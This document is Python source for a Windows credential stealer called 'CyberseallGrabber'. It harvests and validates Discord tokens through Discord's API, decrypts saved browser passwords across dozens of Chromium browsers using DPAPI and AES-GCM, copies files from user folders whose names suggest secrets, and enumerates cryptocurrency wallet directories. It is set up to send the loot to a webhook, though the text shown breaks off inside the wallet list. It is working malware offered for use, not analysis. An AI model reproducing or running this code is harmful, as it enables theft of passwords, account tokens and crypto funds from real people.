import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery','mnemonic','phrase','crypto','bitcoin','ethereum','metamask','trust','exodus','electrum','atomic','coinbase','binance','secret','secrets','token','tokens','auth','login','account','accounts','credential','credentials','bank','banking','paypal','steam','discord','telegram','whatsapp','2fa','authenticator','keychain','keystore','vault','safe','secure','encrypted','decrypt','master','admin','root','user','users','session','sessions','cookie','cookies','cache','saved','remember','autofill','form','forms','data','database','db','sqlite','leveldb','indexeddb','localstorage','sessionstorage','roblox','minecraft','fortnite','valorant','csgo','apex','league','overwatch','wow','gta','fifa','cod','pubg','dota','hearthstone','twitch','youtube','netflix','spotify','amazon','ebay','facebook','instagram','twitter','tiktok','snapchat','reddit','gmail','outlook','yahoo','hotmail','icloud','dropbox','onedrive','googledrive','mega','mediafire','github','gitlab','bitbucket','stackoverflow','linkedin','skype','zoom','teamspeak','slack','notion','trello','asana','jira','confluence','salesforce','shopify','wordpress','wix','squarespace','godaddy','namecheap','cloudflare','aws','azure','gcp','heroku','digitalocean','linode','vultr','ovh','hetzner','contabo']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt_token(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return None
            
            paths = {
                'Discord': os.path.join(os.getenv('APPDATA'), 'discord'),
                'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
                'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
                'Discord Development': os.path.join(os.getenv('APPDATA'), 'discorddevelopment'),
                'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
                'Chrome Beta': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome Beta', 'User Data', 'Default'),
                'Chrome Dev': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome Dev', 'User Data', 'Default'),
                'Chrome Canary': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome SxS', 'User Data', 'Default'),
                'Chromium': os.path.join(os.getenv('LOCALAPPDATA'), 'Chromium', 'User Data', 'Default'),
                'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
                'Edge Beta': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Beta', 'User Data', 'Default'),
                'Edge Dev': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge Dev', 'User Data', 'Default'),
                'Edge Canary': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge SxS', 'User Data', 'Default'),
                'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
                'Brave Beta': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser-Beta', 'User Data', 'Default'),
                'Brave Nightly': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser-Nightly', 'User Data', 'Default'),
                'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
                'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
                'Opera Beta': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Beta', 'Local Storage', 'leveldb'),
                'Opera Developer': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Developer', 'Local Storage', 'leveldb'),
                'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default'),
                'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
                'UC Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'UCBrowser', 'User Data_i18n', 'Default'),
                'Torch': os.path.join(os.getenv('LOCALAPPDATA'), 'Torch', 'User Data', 'Default'),
                'Kometa': os.path.join(os.getenv('LOCALAPPDATA'), 'Kometa', 'User Data', 'Default'),
                'Orbitum': os.path.join(os.getenv('LOCALAPPDATA'), 'Orbitum', 'User Data', 'Default'),
                'CentBrowser': os.path.join(os.getenv('LOCALAPPDATA'), 'CentBrowser', 'User Data', 'Default'),
                '7Star': os.path.join(os.getenv('LOCALAPPDATA'), '7Star', '7Star', 'User Data', 'Default'),
                'Sputnik': os.path.join(os.getenv('LOCALAPPDATA'), 'Sputnik', 'Sputnik', 'User Data', 'Default'),
                'Epic Privacy Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Epic Privacy Browser', 'User Data', 'Default'),
                'Uran': os.path.join(os.getenv('LOCALAPPDATA'), 'uCozMedia', 'Uran', 'User Data', 'Default'),
                'Iridium': os.path.join(os.getenv('LOCALAPPDATA'), 'Iridium', 'User Data', 'Default'),
                'Sleipnir 6': os.path.join(os.getenv('APPDATA'), 'Fenrir Inc', 'Sleipnir5', 'setting', 'modules', 'ChromiumViewer'),
                'Citrio': os.path.join(os.getenv('LOCALAPPDATA'), 'CatalinaGroup', 'Citrio', 'User Data', 'Default'),
                'Coowon': os.path.join(os.getenv('LOCALAPPDATA'), 'Coowon', 'Coowon', 'User Data', 'Default'),
                'Liebao': os.path.join(os.getenv('LOCALAPPDATA'), 'liebao', 'User Data', 'Default'),
                'QIP Surf': os.path.join(os.getenv('LOCALAPPDATA'), 'QIP Surf', 'User Data', 'Default'),
                'Orbitum': os.path.join(os.getenv('LOCALAPPDATA'), 'Orbitum', 'User Data', 'Default'),
                'Comodo Dragon': os.path.join(os.getenv('LOCALAPPDATA'), 'Comodo', 'Dragon', 'User Data', 'Default'),
                'Amigo': os.path.join(os.getenv('LOCALAPPDATA'), 'Amigo', 'User Data', 'Default'),
                'Maxthon3': os.path.join(os.getenv('LOCALAPPDATA'), 'Maxthon3', 'User Data', 'Default'),
                'K-Melon': os.path.join(os.getenv('LOCALAPPDATA'), 'K-Melon', 'User Data', 'Default'),
                'Suhba': os.path.join(os.getenv('LOCALAPPDATA'), 'Suhba', 'User Data', 'Default'),
                'Mustang': os.path.join(os.getenv('LOCALAPPDATA'), 'Mustang', 'User Data', 'Default'),
                'Titan Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Titan Browser', 'User Data', 'Default'),
                'Otter Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Otter', 'profiles', 'default'),
                'Falkon': os.path.join(os.getenv('LOCALAPPDATA'), 'falkon', 'profiles', 'default'),
                'Waterfox': os.path.join(os.getenv('APPDATA'), 'Waterfox', 'Profiles'),
                'Pale Moon': os.path.join(os.getenv('APPDATA'), 'Moonchild Productions', 'Pale Moon', 'Profiles'),
                'Basilisk': os.path.join(os.getenv('APPDATA'), 'Basilisk', 'Profiles'),
                'K-Meleon': os.path.join(os.getenv('APPDATA'), 'K-Meleon'),
                'Seamonkey': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'SeaMonkey', 'Profiles'),
                'Thunderbird': os.path.join(os.getenv('APPDATA'), 'Thunderbird', 'Profiles'),
                'Postbox': os.path.join(os.getenv('APPDATA'), 'Postbox', 'Profiles'),
                'Flock': os.path.join(os.getenv('APPDATA'), 'Flock', 'Browser', 'Profiles'),
                'Wyzo': os.path.join(os.getenv('APPDATA'), 'Wyzo', 'Profiles'),
                'Cyberfox': os.path.join(os.getenv('APPDATA'), '8pecxstudios', 'Cyberfox', 'Profiles'),
                'BlackHawk': os.path.join(os.getenv('APPDATA'), 'NETGATE Technologies', 'BlackHawk', 'Profiles'),
                'IceCat': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'icecat', 'Profiles'),
                'KMeleon': os.path.join(os.getenv('APPDATA'), 'K-Meleon')
            }
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            for platform, path in paths.items():
                try:
                    if not os.path.exists(path):
                        continue
                    state_file = path + "\\Local State"
                    if not os.path.isfile(state_file):
                        continue
                    with open(state_file, "r") as file:
                        key_data = file.read()
                        key = json.loads(key_data)['os_crypt']['encrypted_key']
                        file.close()
                    leveldb_path = path + "\\Local Storage\\leveldb\\"
                    if not os.path.exists(leveldb_path):
                        continue
                    for file in os.listdir(leveldb_path):
                        if not (file.endswith(".ldb") or file.endswith(".log")):
                            continue
                        try:
                            with open(leveldb_path + file, "r", errors='ignore') as files:
                                for x in files.readlines():
                                    x.strip()
                                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\\['(.*)\'\\].*$][^\\\"]*", x):
                                        tokens.append(values)
                        except:
                            continue
                except:
                    continue
            
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            
            for token in cleaned:
                try:
                    tok = decrypt_token(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                    if tok:
                        checker.append(tok)
                except:
                    pass
            
            for value in checker:
                if value not in already_check and len(value) > 50:
                    already_check.append(value)
                    self.t.append(value)
            
            backup_paths = []
            for platform, path in paths.items():
                if 'discord' in platform.lower():
                    backup_paths.append(os.path.join(path, "Local Storage", "leveldb"))
                    backup_paths.append(os.path.join(path, "Session Storage"))
                    backup_paths.append(os.path.join(path, "IndexedDB"))
                    backup_paths.append(os.path.join(path, "databases"))
                elif path.endswith('Default') or 'profiles' in path.lower():
                    backup_paths.append(os.path.join(path, "Local Storage", "leveldb"))
                    backup_paths.append(os.path.join(path, "Session Storage"))
                    backup_paths.append(os.path.join(path, "IndexedDB"))
                    backup_paths.append(os.path.join(path, "databases"))
                    backup_paths.append(os.path.join(path, "Web Data"))
                    backup_paths.append(os.path.join(path, "Preferences"))
                    backup_paths.append(os.path.join(path, "Secure Preferences"))
            
            token_patterns = [
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
                r'mfa\.[\w-]{84}',
                r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}',
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{25}',
                r'OTk4MjM0NzE2NzI2MzI[a-zA-Z0-9+/=]{10,}',
                r'N[a-zA-Z0-9+/=]{20,}',
                r'[a-zA-Z0-9+/=]{88}',
                r'dQw4w9WgXcQ:[a-zA-Z0-9+/=]{100,}',
                r'[\w-]{59}\.[\w-]{6}\.[\w-]{27}',
                r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}'
            ]
            
            for p in backup_paths:
                if os.path.exists(p):
                    try:
                        for f in os.listdir(p):
                            if f.endswith(('.ldb', '.log', '.sqlite', '.db', '.json')):
                                try:
                                    with open(os.path.join(p, f), 'r', errors='ignore', encoding='utf-8') as x:
                                        c = x.read()
                                        for pattern in token_patterns:
                                            backup_tokens = re.findall(pattern, c)
                                            for token in backup_tokens:
                                                if token not in self.t and len(token) > 20:
                                                    self.t.append(token)
                                except:
                                    try:
                                        with open(os.path.join(p, f), 'rb') as x:
                                            c = x.read().decode('utf-8', errors='ignore')
                                            for pattern in token_patterns:
                                                backup_tokens = re.findall(pattern, c)
                                                for token in backup_tokens:
                                                    if token not in self.t and len(token) > 20:
                                                        self.t.append(token)
                                    except:
                                        pass
                    except:
                        pass
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in list(set(self.t)):
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
                if r.status_code == 200:
                    user_data = r.json()
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0),
                        'flags': user_data.get('flags', 0),
                        'public_flags': user_data.get('public_flags', 0),
                        'avatar': user_data.get('avatar', 'None'),
                        'banner': user_data.get('banner', 'None'),
                        'accent_color': user_data.get('accent_color', 'None'),
                        'locale': user_data.get('locale', 'en-US'),
                        'nsfw_allowed': user_data.get('nsfw_allowed', False)
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            pw_data = []
            
            def get_chrome_key():
                try:
                    local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
                    with open(local_state_path, 'r', encoding='utf-8') as f:
                        local_state = json.load(f)
                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                except:
                    return None
            
            def decrypt_password(password, key):
                try:
                    if not password or len(password) < 15:
                        return "Failed to decrypt"
                    try:
                        iv = password[3:15]
                        password = password[15:]
                        cipher = AES.new(key, AES.MODE_GCM, iv)
                        decrypted_pass = cipher.decrypt(password)[:-16].decode()
                        if decrypted_pass:
                            return decrypted_pass
                    except:
                        pass
                    try:
                        result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                        if result and result[1]:
                            return result[1].decode() if isinstance(result[1], bytes) else str(result[1])
                    except:
                        pass
                    try:
                        if isinstance(password, bytes) and len(password) > 20:
                            printable_chars = ''.join(chr(c) for c in password if 32 <= c <= 126)
                            if len(printable_chars) > 4:
                                return f"Partially recovered: {printable_chars}"
                    except:
                        pass
                    return "Failed to decrypt"
                except Exception as e:
                    return f"Error: {str(e)[:20]}"
            
            def get_browser_key(browser_path):
                try:
                    local_state_path = os.path.join(browser_path, "Local State")
                    if os.path.exists(local_state_path):
                        with open(local_state_path, 'r', encoding='utf-8') as f:
                            local_state = json.load(f)
                        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
                except:
                    pass
                return None
            
            chrome_key = get_chrome_key()
            browsers = [
                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")),
                ("Chrome Beta", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Beta", "User Data", "Default", "Login Data")),
                ("Chrome Dev", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome Dev", "User Data", "Default", "Login Data")),
                ("Chrome Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Login Data")),
                ("Chromium", os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data", "Default", "Login Data")),
                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")),
                ("Edge Beta", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Beta", "User Data", "Default", "Login Data")),
                ("Edge Dev", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge Dev", "User Data", "Default", "Login Data")),
                ("Edge Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge SxS", "User Data", "Default", "Login Data")),
                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")),
                ("Brave Beta", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Beta", "User Data", "Default", "Login Data")),
                ("Brave Nightly", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser-Nightly", "User Data", "Default", "Login Data")),
                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")),
                ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")),
                ("Opera Beta", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Beta", "Login Data")),
                ("Opera Developer", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Developer", "Login Data")),
                ("Vivaldi", os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default", "Login Data")),
                ("Yandex", os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Login Data")),
                ("UC Browser", os.path.join(os.getenv("LOCALAPPDATA"), "UCBrowser", "User Data_i18n", "Default", "Login Data")),
                ("Torch", os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data", "Default", "Login Data")),
                ("Kometa", os.path.join(os.getenv("LOCALAPPDATA"), "Kometa", "User Data", "Default", "Login Data")),
                ("Orbitum", os.path.join(os.getenv("LOCALAPPDATA"), "Orbitum", "User Data", "Default", "Login Data")),
                ("CentBrowser", os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data", "Default", "Login Data")),
                ("7Star", os.path.join(os.getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data", "Default", "Login Data")),
                ("Sputnik", os.path.join(os.getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data", "Default", "Login Data")),
                ("Epic Privacy Browser", os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data", "Default", "Login Data")),
                ("Uran", os.path.join(os.getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data", "Default", "Login Data")),
                ("Iridium", os.path.join(os.getenv("LOCALAPPDATA"), "Iridium", "User Data", "Default", "Login Data")),
                ("Citrio", os.path.join(os.getenv("LOCALAPPDATA"), "CatalinaGroup", "Citrio", "User Data", "Default", "Login Data")),
                ("Coowon", os.path.join(os.getenv("LOCALAPPDATA"), "Coowon", "Coowon", "User Data", "Default", "Login Data")),
                ("Liebao", os.path.join(os.getenv("LOCALAPPDATA"), "liebao", "User Data", "Default", "Login Data")),
                ("QIP Surf", os.path.join(os.getenv("LOCALAPPDATA"), "QIP Surf", "User Data", "Default", "Login Data")),
                ("Comodo Dragon", os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data", "Default", "Login Data")),
                ("Amigo", os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default", "Login Data")),
                ("Maxthon3", os.path.join(os.getenv("LOCALAPPDATA"), "Maxthon3", "User Data", "Default", "Login Data")),
                ("K-Melon", os.path.join(os.getenv("LOCALAPPDATA"), "K-Melon", "User Data", "Default", "Login Data")),
                ("Suhba", os.path.join(os.getenv("LOCALAPPDATA"), "Suhba", "User Data", "Default", "Login Data")),
                ("Mustang", os.path.join(os.getenv("LOCALAPPDATA"), "Mustang", "User Data", "Default", "Login Data")),
                ("Titan Browser", os.path.join(os.getenv("LOCALAPPDATA"), "Titan Browser", "User Data", "Default", "Login Data")),
                ("Firefox", os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")),
                ("Waterfox", os.path.join(os.getenv("APPDATA"), "Waterfox", "Profiles")),
                ("Pale Moon", os.path.join(os.getenv("APPDATA"), "Moonchild Productions", "Pale Moon", "Profiles")),
                ("Basilisk", os.path.join(os.getenv("APPDATA"), "Basilisk", "Profiles")),
                ("Seamonkey", os.path.join(os.getenv("APPDATA"), "Mozilla", "SeaMonkey", "Profiles")),
                ("Thunderbird", os.path.join(os.getenv("APPDATA"), "Thunderbird", "Profiles")),
                ("Postbox", os.path.join(os.getenv("APPDATA"), "Postbox", "Profiles")),
                ("Flock", os.path.join(os.getenv("APPDATA"), "Flock", "Browser", "Profiles")),
                ("Wyzo", os.path.join(os.getenv("APPDATA"), "Wyzo", "Profiles")),
                ("Cyberfox", os.path.join(os.getenv("APPDATA"), "8pecxstudios", "Cyberfox", "Profiles")),
                ("BlackHawk", os.path.join(os.getenv("APPDATA"), "NETGATE Technologies", "BlackHawk", "Profiles")),
                ("IceCat", os.path.join(os.getenv("APPDATA"), "Mozilla", "icecat", "Profiles"))
            ]
            
            for b, bp in browsers:
                if os.path.exists(bp):
                    if "Firefox" in b or "Waterfox" in b or "Pale Moon" in b or "Basilisk" in b or "Seamonkey" in b or "Thunderbird" in b or "Postbox" in b or "Flock" in b or "Wyzo" in b or "Cyberfox" in b or "BlackHawk" in b or "IceCat" in b:
                        for root, dirs, files in os.walk(bp):
                            for file in files:
                                if file == "logins.json":
                                    try:
                                        with open(os.path.join(root, file), 'r') as f:
                                            data = json.load(f)
                                            for login in data.get('logins', []):
                                                pw_data.append(b + " - " + login['hostname'] + " - " + login['username'] + " - [FIREFOX_ENCRYPTED]")
                                    except:
                                        pass
                                elif file == "signons.sqlite" or file == "key3.db" or file == "key4.db":
                                    try:
                                        tp = os.path.join(os.getenv("TEMP"), b + "_" + file + "_" + str(os.getpid()) + ".db")
                                        shutil.copy2(os.path.join(root, file), tp)
                                        cn = sqlite3.connect(tp)
                                        cr = cn.cursor()
                                        if file == "signons.sqlite":
                                            cr.execute("SELECT hostname,username,password FROM moz_logins")
                                            for u, n, pw in cr.fetchall():
                                                if n and pw:
                                                    pw_data.append(b + " - " + u + " - " + n + " - [FIREFOX_ENCRYPTED]")
                                        cn.close()
                                        os.remove(tp)
                                    except:
                                        pass
                    else:
                        try:
                            tp = os.path.join(os.getenv("TEMP"), b.replace(" ", "_") + "_" + str(os.getpid()) + ".db")
                            shutil.copy2(bp, tp)
                            cn = sqlite3.connect(tp)
                            cr = cn.cursor()
                            cr.execute("SELECT origin_url,username_value,password_value FROM logins")
                            
                            browser_key = get_browser_key(os.path.dirname(os.path.dirname(bp))) if chrome_key is None else chrome_key
                            
                            for u, n, pw in cr.fetchall():
                                if n and pw:
                                    decrypted = "Failed to decrypt"
                                    
                                    if browser_key:
                                        decrypted = decrypt_password(pw, browser_key)
                                    elif chrome_key:
                                        decrypted = decrypt_password(pw, chrome_key)
                                    
                                    if "Failed" in decrypted or "Error" in decrypted:
                                        try:
                                            decrypted = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode()
                                        except:
                                            try:
                                                if isinstance(pw, bytes):
                                                    decrypted = pw.decode('utf-8', errors='ignore')
                                                    if len(decrypted) < 3:
                                                        decrypted = "[ENCRYPTED]"
                                                else:
                                                    decrypted = "[ENCRYPTED]"
                                            except:
                                                decrypted = "[ENCRYPTED]"
                                    
                                    pw_data.append(b + " - " + u + " - " + n + " - " + decrypted)
                            cn.close()
                            os.remove(tp)
                        except Exception as e:
                            pass
            
            self.p = pw_data
            with open(os.path.join(self.d, "passwords.txt"), "w") as f:
                f.write("\n".join(pw_data))
        except:
            pass

    def fi(self):
        try:
            files_data = []
            exclude_dirs = ['node_modules','venv','.git','.vs','bin','obj','packages','__pycache__','dist','build','target','out','temp','tmp','cache','logs','log','backup','backups','.vscode','.idea','vendor','third_party','3rdparty','external','lib','libs','library','libraries','dependencies','deps','modules','mod','addons','plugins','extensions','assets','resources','res','static','public','www','html','css','js','javascript','typescript','images','img','pics','pictures','photos','videos','video','audio','music','sounds','fonts','font','icons','icon','textures','texture','models','model','animations','animation','shaders','shader','materials','material','prefabs','prefab','scenes','scene','levels','level','maps','map','saves','save','configs','config','settings','prefs','preferences','options','opt','data','databases','db','sql','sqlite','mysql','postgres','mongodb','redis','cache','caches','sessions','session','cookies','cookie','temp','temporary','tmp','logs','log','debug','trace','error','errors','crash','crashes','dump','dumps','core','cores','pid','lock','locks','sem','semaphore','mutex','shared','shm','ipc','pipe','pipes','socket','sockets','fifo','fifos','dev','proc','sys','var','usr','opt','etc','boot','root','home','mnt','media','run','srv','tmp','lost+found']
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        ds[:] = [d for d in ds if d.lower() not in exclude_dirs]
                        for f in fs:
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat','.db','.sqlite','.csv','.xml','.ini','.conf','.cfg','.env','.bak','.backup')) and os.path.getsize(os.path.join(r,f)) < 2*1024*1024 and not any(exclude in r.lower() for exclude in exclude_dirs):
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "Ethereum"),
                os.path.join(os.getenv("APPDATA"), "Bitcoin"),
                os.path.join(os.getenv("APPDATA"), "Litecoin"),
                os.path.join(os.getenv("APPDATA"), "Dogecoin"),
                os.path.join(os.getenv("APPDATA"), "Zcash"),
                os.path.join(os.getenv("APPDATA"), "Dash"),
                os.path.join(os.getenv("APPDATA"), "Monero"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Jaxx"),
                os.path.join(os.getenv("APPDATA"), "com.liberty.jaxx"),
                os.path.join(os.getenv("APPDATA"), "Guarda"),
                os.path.join(os.getenv("APPDATA"), "Trust Wallet"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("APPDATA"), "Coinbase Wallet"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "Solflare"),
                os.path.join(os.getenv("APPDATA"), "Slope"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Ronin"),
                os.path.join(os.getenv("APPDATA"), "Nifty"),
                os.path.join(os.getenv("APPDATA"), "MathWallet"),
                os.path.join(os.getenv("APPDATA"), "TokenPocket"),
                os.path.join(os.getenv("APPDATA"), "iWallet"),
                os.path.join(os.getenv("APPDATA"), "Wombat"),
                os.path.join(os.getenv("APPDATA"), "MEW"),
                os.path.join(os.getenv("APPDATA"), "Guild"),
                os.path.join(os.getenv("APPDATA"), "Saturn"),
                os.path.join(os.getenv("APPDATA"), "Harmony"),
                os.path.join(os.getenv("APPDATA"), "Coin98"),
                os.path.join(os.getenv("APPDATA"), "TerraStation"),
                os.path.join(os.getenv("APPDATA"), "Keplr"),
                os.path.join(os.getenv("APPDATA"), "Cosmostation"),
                os.path.join(os.getenv("APPDATA"), "Leap"),
                os.path.join(os.getenv("APPDATA"), "Xdefi"),
                os.path.join(os.getenv("APPDATA"), "Nami"),
                os.path.join(os.getenv("APPDATA"), "Eternl"),
                os.path.join(os.getenv("APPDATA"), "Yoroi"),
                os.path.join(os.getenv("APPDATA"), "Flint"),
                os.path.join(os.getenv("APPDATA"), "Daedalus"),
                os.path.join(os.getenv("APPDATA"), "Adalite"),
                os.path.join(os.getenv("APPDATA"), "Typhon"),
                os.path.join(os.getenv("APPDATA"), "Gero"),
                os.path.join(os.getenv("APPDATA"), "NuFi"),
                os.path.join(os.getenv("APPDATA"), "Martian"),
                os.path.join(os.getenv("APPDATA"), "Pontem"),
                os.path.join(os.getenv("APPDATA"), "Petra"),
                os.path.join(os.getenv("APPDATA"), "Fewcha"),
                os.path.join(os.getenv("APPDATA"), "Spika"),
                os.path.join(os.getenv("APPDATA"), "Rise"),
                os.path.join(os.getenv("APPDATA"), "Bitkeep"),
                os.path.join(os.getenv("APPDATA"), "Enkrypt"),
                os.path.join(os.getenv("APPDATA"), "Frame"),
                os.path.join(os.getenv("APPDATA"), "Liquality"),
                os.path.join(os.getenv("APPDATA"), "XDEFI"),
                os.path.join(os.getenv("APPDATA"), "Rabby"),
                os.path.join(os.getenv("APPDATA"), "Talisman"),
                os.path.join(os.getenv("APPDATA"), "SubWallet"),
                os.path.join(os.getenv("APPDATA"), "Polkadot"),
                os.path.join(os.getenv("APPDATA"), "Clover"),
                os.path.join(os.getenv("APPDATA"), "Nova"),
                os.path.join(os.getenv("APPDATA"), "Fearless"),
                os.path.join(os.getenv("APPDATA"), "PolkaWallet"),
                os.path.join(os.getenv("APPDATA"), "Enzyme"),
                os.path.join(os.getenv("APPDATA"), "Sender"),
                os.path.join(os.getenv("APPDATA"), "Finnie"),
                os.path.join(os.getenv("APPDATA"), "ArConnect"),
                os.path.join(os.getenv("APPDATA"), "Braavos"),
                os.path.join(os.getenv("APPDATA"), "ArgentX"),
                os.path.join(os.getenv("APPDATA"), "Starknet"),
                os.path.join(os.getenv("APPDATA"), "Oxygen"),
                os.path.join(os.getenv("APPDATA"), "Backpack"),
                os.path.join(os.getenv("APPDATA"), "Glow"),
                os.path.join(os.getenv("APPDATA"), "Sollet"),
                os.path.join(os.getenv("APPDATA"), "Coin98"),
                os.path.join(os.getenv("APPDATA"), "Slope"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "Solflare"),
